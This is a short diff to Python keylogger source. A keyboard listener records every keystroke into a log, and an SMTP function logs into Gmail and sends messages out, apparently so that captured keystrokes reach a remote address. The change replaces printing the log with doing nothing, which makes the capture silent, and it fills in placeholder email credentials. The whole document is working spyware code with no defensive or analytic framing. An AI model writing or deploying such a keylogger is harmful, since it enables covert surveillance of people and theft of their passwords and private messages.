@@ -13,14 +13,14 @@ def main_func():
             log = log + str(key.char)
         except AttributeError:
             if key == key.enter:
-                print(log)
+                pass
     with keyboard.Listener(on_press=callback_function) as listener:
         listener.join()
 
 def send_email(sender,receiver,message):
     email_server = smtplib.SMTP("smtp.gmail.com",587)
     email_server.starttls()
-    email_server.login("","")
+    email_server.login("youremail","yourpassword")
     email_server.sendmail(sender,receiver,message.encode("utf-8"))
 
 def thread_func():
